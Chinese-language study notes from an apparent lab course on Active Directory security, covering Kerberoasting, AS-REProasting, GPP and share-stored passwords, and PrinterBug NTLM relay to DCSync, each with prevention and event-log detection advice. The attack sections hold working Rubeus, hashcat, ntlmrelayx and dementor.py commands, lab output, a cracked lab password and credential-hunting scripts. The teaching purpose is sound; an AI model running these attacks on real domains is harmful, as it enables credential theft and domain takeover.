## AD大舞台

### 简介

`Active Directory` ( `AD` ) 是 Microsoft 于 2000 年随 Windows Server 2000 正式发布的 Windows 企业环境目录服务。随着每个新服务器操作系统版本的发布，Microsoft 一直在逐步改进 AD 。 AD 基于之前的协议 x.500 和 LDAP（至今仍以某种形式使用），AD 是一种分布式分层结构，允许集中管理组织的资源，包括用户、计算机、组、网络设备和文件共享、组策略、设备和信任。 AD 在 Windows 企业环境中提供身份验证、记帐和授权功能。它还允许管理员管理权限和对网络资源的访问。

Active Directory 的应用如此广泛，以至于它成为全球使用最广泛的身份和访问管理 ( `IAM` ) 解决方案。因此，绝大多数企业应用程序都与 Active Directory 无缝集成和运行。 Active Directory 是任何企业中最关键的服务。 Active Directory 环境受到损害意味着对其所有系统和数据的访问不受限制，从而违反了其 `CIA` （ `Confidentiality` 、 `Integrity` 和 `Availability` ). 研究人员不断发现并披露 AD 中的漏洞。通过这些漏洞，威胁行为者可以利用称为勒索软件的恶意软件，通过对组织的数据执行加密操作 ( `encryption` ) 来勒索赎金，从而使其变得毫无用处，直到他们付费购买解密密钥 ( `not advised` ) 或在 IT 安全专业人员的帮助下获取解密密钥。但是，如果我们回想一下，Active Directory 泄露意味着所有应用程序、系统和数据的泄露，而不是单个系统或服务的泄露。

我们来看看过去三年（2020年至2022年）公开披露的漏洞。 Microsoft 拥有超过 3000 个漏洞，自 1999 年以来约有 9000 个漏洞，这意味着过去几年中研究和漏洞的增长令人难以置信。保持 Active Directory 安全的最明显做法是确保适当的 `Patch Management` 到位，因为补丁管理目前给全球组织带来了挑战。对于本模块，我们将假设补丁管理做得正确（正确的补丁管理对于抵御攻击的能力至关重要），并重点关注我们可能遇到的其他攻击和漏洞。我们将重点展示滥用常见错误配置和AD功能的攻击，尤其是那些非常常见/熟悉但极其难以消除的攻击。此外，这里讨论的保护措施旨在为我们的未来做好准备，帮助我们建立适当的网络卫生。如果您正在考虑 `Defence in depth` 、 `Network segmentation` 等，那么您就走在正确的道路上。

`Active Directory Data Store` 是负责存储和管理用户、服务和应用程序的目录信息的数据库文件和进程。 Active Directory 数据存储在文件 `NTDS.DIT` ，这是 AD 环境中最关键的文件；域控制器将其存储在 `%SystemRoot%\NTDS` 文件夹中

没有添加权限的 `Regular AD user account` 可用于枚举 AD 中包含的大多数对象，包括但不限于: Computers, Users, Group Information, GPOs, ACLs

尽管 AD 的设置允许修改/禁止此默认行为，但其影响可能会导致应用程序、服务和 Active Directory 本身的彻底崩溃。

`LDAP` 是网络环境中的系统用来与 Active Directory 进行通信的协议。域控制器运行 LDAP 并不断侦听来自网络的请求。

> Authentication 

- 用户名/密码，以密码散列形式存储或传输（ `LM` 、 `NTLM` 、 `NetNTLMv1` / `NetNTLMv2` ）
- `Kerberos` 票证（Microsoft 对 Kerberos 协议的实现）。 Kerberos 充当受信任的第三方，与域控制器 (DC) 合作对尝试访问服务的客户端进行身份验证。 Kerberos 身份验证工作流程围绕票证进行，票证充当客户端之间、服务和 DC 之间交换的身份加密证明。
- `Authentication over LDAP` 。允许通过传统的用户名/密码或用户或计算机证书进行身份验证
- 安装在 DC 上用于创建票证的 Kerberos 服务。 KDC 的组件是身份验证服务器 (AS) 和票证授予服务器 (TGS)。`Kerberos Tickets` 是充当身份证明的令牌（由 KDC 创建）,`TGT` 是客户端向KDC提交有效用户信息的证明,`TGS` 是为客户端（具有有效 TGT）想要访问的每个服务创建的
- `KDC key` 是证明TGT有效的加密密钥。 AD 根据 `KRBTGT` 帐户（AD 域中创建的第一个帐户）的哈希密码创建 KDC 密钥。尽管它是一个禁用用户，但 KRBTGT 的重要目的是存储以密码哈希形式随机生成的密钥的秘密。人们可能永远不知道实际的密码值代表什么（即使我们尝试将其配置为已知值，AD 也会自动将其覆盖为随机值）

每个域都包含组 `Domain admins` 和 `Administrators` ，它们是具有广泛访问权限的最高特权组。默认情况下，AD 将域管理员的成员添加为所有加入域的计算机上的管理员，并因此授予登录它们的权限。虽然默认情况下域的“管理员”组只能登录到域控制器，但他们可以管理任何 Active Directory 对象（例如，所有服务器，因此可以为自己分配登录权限）。林中最顶层的域还包含一个对象，即组 `Enterprise Admins` ，它具有林中所有域的权限。

Active Directory 中的默认组具有很高的特权并带有隐藏的风险。例如，考虑组 `Account Operators` 。当询问 AD 管理员将其分配给用户/超级用户的原因是什么时，他们会回答说这使“服务台”的工作更容易，因为这样他们就可以重置用户密码。它们没有创建新组并将特定权限委派给包含用户帐户的组织单位，而是违反了最小权限原则并危及所有用户。随后，这将包括从帐户操作员到域管理员的升级路径，最常见的一种是通过 Azure AD Connect 在安装时创建的“MSOL_”用户帐户。这些帐户放置在默认的“用户”容器中，“帐户操作员”可以在其中修改用户对象。

必须强调的是，Windows 具有多种登录类型：用户“如何”登录到计算机，例如，当用户物理存在于设备上或通过 RDP 远程登录时，可以进行交互。了解登录类型非常重要，因为它们会在访问的系统上留下“痕迹”。该痕迹是使用的用户名和密码。根据经验，除“网络登录，类型 3”之外的登录类型都会在经过身份验证和连接的系统上留下凭据。 Microsoft 在此处提供了登录类型的完整列表。

为了与域控制器上的 Active Directory 进行交互，我们必须使用它的语言 LDAP。任何查询都是通过将 LDAP 中特制的消息发送到域控制器来发生的，例如获取用户信息和组的成员身份。在其诞生之初，微软就意识到 LDAP 并不是一种“漂亮”的语言，他们发布了图形工具，可以在友好的界面中呈现数据并将“鼠标点击”转换为 LDAP 查询。 Microsoft 开发了 `Remote Server Administration Tools` (RSAT)，从而能够在域控制器上本地或从另一个计算机对象远程与Active Directory 进行交互。最流行的工具是 `Active Directory Users and Computers` （允许访问查看/移动/编辑/创建对象，例如用户、组和计算机）和 `Group Management Policy` （允许创建和修改集团政策）。

任何 Windows 环境中的重要网络端口包括（记住它们非常有益）：53,88135,137-139&445,389&636, 3389,5985&5986

### 真实世界

每个在某个时候（试图）提高其成熟度的组织都经历过对其系统进行分类的练习。分类定义了各个系统对业务的 `importance` ，例如 `ERP` 、 `CRM` 、 `backups` 。企业依靠这一点来成功实现其目标，并且各个组织之间存在显着差异。在 Active Directory 中，任何在开箱即用的基础上“添加”的附加角色、服务和功能都必须进行分类。此分类是必要的，以确保我们为哪些服务（如果受到威胁）设定标准，从而对 Active Directory 的其余部分构成升级风险。在此设计视图中，我们需要确保任何允许直接（或间接）升级的服务都被视为域控制器/Active Directory。 Active Directory 庞大、复杂且功能丰富 - 每一块岩石下都存在潜在的升级风险。 Active Directory 将在企业组织中提供 DNS、PKI 和端点配置管理器等服务。如果攻击者要获得这些服务的管理权限，他们将有办法间接将其权限升级为 `entire forest` 管理员的权限。我们将通过本模块后面描述的一些攻击路径来演示这一点。

然而，Active Directory 有其局限性。不幸的是，这些限制是一个“弱点”，并扩大了我们的攻击面——一些是由于复杂性而产生的，另一些是设计造成的，还有一些是由于遗留和向后兼容性造成的。为了完整起见，以下是每个示例的三个示例：

- `Complexity` - 最简单的示例是找出嵌套组成员。当查看谁是一个组的成员、另一个组的成员以及另一个组的成员时，很容易迷失方向。虽然您可能认为这条链最终会结束，但许多环境中每个“域用户”都间接成为“域管理员”的成员。

- `Design` - Ative Directory 允许通过组策略对象 (GPO) 远程管理计算机。 AD 将 GPO 存储在名为 `SYSVOL` 的唯一网络共享/文件夹中，所有加入域的设备都会在其中提取应用于它们的设置。由于它是网络共享文件夹，因此客户端通过 SMB 协议访问 SYSVOL 并传输存储的信息。因此，对于要使用新设置的计算机，它必须调用域控制器并从 SYSVOL 中提取设置 - 这是一个系统过程，默认情况下每 90 分钟发生一次。每个设备都必须有一个“可见”的域控制器来从中提取这些数据。这样做的缺点是 SMB 协议还允许执行代码（远程命令 shell，命令将在域控制器上执行），因此只要我们拥有一组有效的凭据，我们就可以一致地通过 SMB 执行代码远程在域控制器上。此端口/协议可用于域控制器的所有计算机。 （此外，SMB 不太适合（通常是 Active Directory）零信任概念。）如果攻击者拥有一组良好的特权凭据，他们可以通过 SMB 在域控制器上以该帐户的身份执行代码（至少！）

- `Legacy` - Windows 的设计主要关注点是：对于大多数 Microsoft 客户来说，它开箱即用。**默认情况下，Windows  不是安全的**。一个遗留的例子是，Windows 附带了默认启用的类似广播的 DNS 协议 `NetBIOS` 和 `LLMNR` 。这些协议旨在在 DNS 失败时使用。然而，即使不活跃，它们也会活跃。然而，由于其设计，它们会在线上广播用户凭据（用户名、密码、密码哈希），这可以有效地向在线监听的任何人提供特权凭据，只需在场即可。这篇博文演示了在网络上捕获凭据的滥用情况。https://www.a2secure.com/blog-en/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/

### 连接到实验室

# Kerberoasting

## 攻击描述

在 Active Directory 中，服务主体名称 (SPN) 是唯一的服务实例标识符。`Kerberos` 使用 SPN 进行身份验证，将服务实例与服务登录帐户关联起来，这样即使客户端没有帐户名，客户端应用程序也可以请求服务对帐户进行身份验证。当请求 Kerberos `TGS` 服务票证时，它会使用服务帐户的 NTLM 密码哈希进行加密。

`Kerberoasting` 是一种后利用攻击，它试图通过获取票证并执行离线密码破解来打开票证来利用此行为。如果票证打开，则打开票证的候选人密码就是服务帐户的密码。此攻击的成功取决于:
- 服务帐户密码的强度。
- 另一个有一定影响的因素是创建票证时使用的加密算法，可能的选项是：AES, RC4、DES

这三者之间的破解速度存在显着差异，因为 AES 的破解速度比其他方法慢。虽然安全最佳实践建议禁用 `RC4` （和 `DES` ，如果由于某种原因启用），但大多数环境并不这样做。需要注意的是，并非所有应用程序供应商都已迁移到支持 AES（大多数但不是全部）。默认情况下， `KDC` 创建的票证将是支持最强大/最高加密算法的票证。但是，攻击者可以强制降级回 `RC4`

## 攻击路径

为了获得可破解的门票，我们可以使用Rubeus。当我们使用 `kerberoast` 操作运行该工具而不指定用户时，它将为每个注册了 SPN 的用户提取票证（在大型环境中，这很容易达到数百个）

```powershell
# 提取所有存在Kerberoasting的账号票据，并将其存储在输出文件
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : eagle.local
[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3

[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 12.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt


[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 13.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\spn.txt
PS C:\Users\bob\Downloads>
```

然后，我们需要将提取的带有票据的文件移动到 Kali Linux VM 进行破解（我们将只关注管理员帐户的文件，即使 `Rubeus` 提取了两张票据）。

我们可以将 `hashcat` 与哈希模式（选项 `-m` ） `13100` 一起使用作为 `Kerberoastable TGS` 。我们还传递一个带有密码的字典文件（文件 `passwords.txt` ），并将任何成功破解的票据的输出保存到名为 `cracked.txt` 的文件中：

## Kerberoasting 预防
此攻击的成功取决于服务帐户密码的强度。虽然我们应该
- 限制具有 SPN 的帐户数量
- 并禁用不再使用/不需要的帐户，
- 但我们必须确保它们拥有强密码。对于任何支持它的服务，密码应该是 100+ 随机字符（AD 中允许的最大字符数为 127），这确保破解密码实际上是不可能的。

```
此攻击的成功取决于服务帐户密码的强度。虽然我们应该限制具有 SPN 的帐户数量并禁用不再使用/不需要的帐户，但我们必须确保它们拥有强密码。对于任何支持它的服务，密码应该是 100+ 随机字符（AD 中允许的最大字符数为 127），这确保破解密码实际上是不可能的。
```

## Kerberoasting 探测
当请求 `TGS` 时，会生成 ID 为 `4769` 的事件日志。然而，每当用户尝试连接服务时，AD也会生成相同的事件ID，这意味着该事件的数量是巨大的，仅依靠它作为检测方法实际上是不可能的。如果我们碰巧处于所有应用程序都支持 AES 并且仅生成 AES 票证的环境中，那么这将是针对事件 ID `4769` 发出警报的绝佳指标。如果票据选项设置为 `RC4` ，即如果 `RC4` 票据是在 AD 环境中生成的（这不是默认配置），那么我们应该提醒并跟进它。以下是我们请求票证来执行此攻击时记录的内容

![[Pasted image 20240718215140.png]]


# AS-REProasting

## 攻击描述

`AS-REProasting` 攻击与 `Kerberoasting` 攻击类似；我们可以获得启用了属性 `Do not require Kerberos preauthentication` 的用户帐户的可破解哈希值。这种攻击的成功取决于我们要破解的用户帐户密码的强度。

## 攻击路径
为了获得可破解的哈希值，我们可以再次使用 `Rubeus` 。不过，这一次，我们将使用 `asreproast` 操作。如果我们不指定名称， `Rubeus` 将为每个不需要 `Kerberos preauthentication` 的用户提取哈希值：

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: AS-REP roasting

[*] Target Domain          : eagle.local

[*] Searching path 'LDAP://DC2.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : anni
[*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC2.eagle.local (172.16.18.4)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\asrep.txt
```

一旦 `Rubeus` 获得用户 Anni 的哈希值（Playground 环境中唯一不需要预身份验证的用户），我们将把输出文本文件移动到 Linux 攻击机器。为了使 `hashcat` 能够识别哈希值，我们需要在 `$krb5asrep$` 之后添加 `23$` 来编辑它：

```shell
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
```

现在，我们可以将 `hashcat` 与哈希模式（选项 -m） `18200` 一起使用来实现 `AS-REPRoastable` 哈希。我们还传递一个带有密码的字典文件（文件 `passwords.txt` ），并将任何成功破解的票据的输出保存到文件 `asrepcracked.txt` ：

```shell
xianzhi@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force

hashcat (v6.2.5) starting

<SNIP>

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$anni@eagle.local:1b912b858c4551c0013d...3d2550
Time.Started.....: Thu Dec 8 06:08:47 2022, (0 secs)
Time.Estimated...: Thu Dec 8 06:08:47 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   130.2 kH/s (0.65ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> brady
Hardware.Mon.#1..: Util: 26%

Started: Thu Dec 8 06:08:11 2022
Stopped: Thu Dec 8 06:08:49 2022
```

一旦 `hashcat` 破解了密码，我们可以打印输出文件的内容来获取明文密码 `Slavi123`

## 攻击预防

首先也是最重要的，我们应该只在需要时使用这个属性；一个好的做法是每季度审查一次账户，以确保我们没有分配该属性。由于此属性经常出现在一些常规用户帐户中，因此它们的密码往往比具有 SPN 的服务帐户（来自 Kerberoast 的服务帐户）更容易破解。因此，对于需要此配置的用户，我们应该分配一个单独的密码策略，该策略需要至少 20 个字符来阻止破解尝试。

## 攻击探测
当我们执行 Rubeus 时，生成了 ID 为 `4768` 的事件，表示生成了 `Kerberos Authentication ticket` ：
![[Pasted image 20240718220126.png]]

需要注意的是，AD 会为每个使用 Kerberos 对任何设备进行身份验证的用户生成此事件；因此，本次活动的存在感非常丰富。然而，我们可以知道用户从哪里进行身份验证，然后我们可以使用它来将已知的良好登录与潜在的恶意哈希提取相关联。检查特定 IP 地址可能很困难，尤其是当用户在办公地点周围移动时。然而，可以仔细检查特定的 VLAN 并对其外部的任何情况发出警报。



1. Kerbe Roasting

2. AS-REP Roasting

3. GPP Passwords

```
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

4. GPO Permissions / GPO Files

```powershell
# Define filter for the last 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Search for event ID 5136 (GPO modified) in the past 15 minutes
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}


if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody = $emailBody + "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Send an alert via email - complete the command below
    # Send-MailMessage
    $emailBody
}
```



5. Credentials in Shared

```powershell
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess

cd \\Server01.eagle.local\dev$
findstr /m /s /i "pass" *.bat
findstr /m /s /i "pass" *.cmd
findstr /m /s /i "pass" *.ini
findstr /m /s /i "pass" *.config


findstr /m /s /i "pw" *.config
findstr /s /i "pw" *.config

findstr /m /s /i "eagle" *.ps1
findstr /s /i "eagle" *.ps1
```



攻击：通过在 `Description` 或 `Info` 字段中查找特定搜索词/字符串来查询整个域

```powershell
# 创建函数：搜索用户明文信息
Function SearchUserClearTextInformation
{
# 定义两个参数，一个参数为，一个参数为字符串对象
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )
# 
    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
```

```powershell
# 运行脚本来寻找字符串 pass
SearchUserClearTextInformation -Terms "pass"
```



```
sed -i 's/\s\s+/\n/g' cert.pem
```





# Print Spooler & NTLM Relaying

打印后台处理程序是默认启用的一项旧服务，即使使用最新的 Windows 桌面和服务器版本也是如此。 
2018 年，当 `Lee Christensen` 发现 `PrinterBug` 时，该服务成为流行的攻击媒介。函数 RpcRemoteFindFirstPrinterChangeNotification 和 RpcRemoteFindFirstPrinterChangeNotificationEx 可能被滥用来强制远程计算机执行与其可以到达的任何其他计算机的连接，而且连接将携带身份验证信息作为 `TGT` 。因此，任何域用户都可以强制 `RemoteServer$` 对任何计算机进行身份验证。微软对 `PrinterBug` 的立场是它不会被修复，因为这个问题是“设计使然”的。

`PrinterBug` 的影响是任何启用打印后台处理程序的域控制器都可能通过以下方式之一受到损害：

- 将连接中继到另一个 DC 并执行 DCSync（如果禁用 `SMB Signing` ）
- 强制域控制器连接到配置为 `Unconstrained Delegation` ( `UD` ) 的计算机 - 这会将 TGT 缓存在 UD 服务器的内存中，可以使用以下工具捕获/导出 TGT `Rubeus` 和 `Mimikatz`
- 将连接中继到 `Active Directory Certificate Services` 以获取域控制器的证书。然后，威胁代理可以按需使用证书来进行身份验证并冒充域控制器（例如 DCSync）
- 中继连接以配置中继计算机的 `Resource-Based Kerberos Delegation` 。然后，我们可以滥用委派来以该计算机的任何管理员身份进行身份验证。


## 攻击路径
在此攻击路径中，我们会将连接中继到另一个 DC 并执行 `DCSync` （即列出的第一个妥协技术）。为了使攻击成功，必须关闭域控制器上的 SMB 签名。首先，我们将配置 `NTLMRelayx` 将所有连接转发到 DC2 并尝试执行 DCSync 攻击

```shell
xianzhi@htb[/htb]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

接下来，我们需要使用具有 `NTLMRelayx` 监听功能的 Kali 盒子来触发 `PrinterBug` 。为了重新触发连接，我们将使用 Dementor.py（当从未加入域的计算机运行时，需要任何经过身份验证的用户凭据，在这种情况下，我们假设我们之前已经拿到了 Bob）：

```shell
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```
现在，使用 `NTLMRelayx` 切换回终端会话，我们将看到 DCSync 成功。

## 预防
应在所有非打印服务器的服务器上禁用打印后台处理程序。域控制器和其他核心服务器永远不应该具有额外的角色/功能来打开和扩大针对核心 AD 基础设施的攻击面。

此外，还有一个选项可以防止滥用 `PrinterBug` 同时保持服务运行：
禁用注册表项 `RegisterSpoolerRemoteRpcEndPoint` 时，任何传入的远程请求都会被阻止；这就像为远程客户端禁用了该服务一样。将注册表项设置为 1 可以启用它，而设置为 2 则可以禁用它。

## 检测

利用 `PrinterBug` 将留下与域控制器的网络连接的痕迹；然而，它们太通用，无法用作检测机制。使用 `NTLMRelayx` 执行DCSync的情况下，不会生成事件ID `4662` （如DCSync部分所述）；但是，要从 DC2 获取 DC1 的哈希值，DC1 将会发生成功的登录事件。该事件源自 Kali 机器的 IP 地址，而不是域控制器，如下所示：
![[Pasted image 20240718222508.png]]

合适的检测机制始终将来自核心基础设施服务器的所有登录尝试与其各自的 IP 地址（应该是静态的且已知的）相关联。

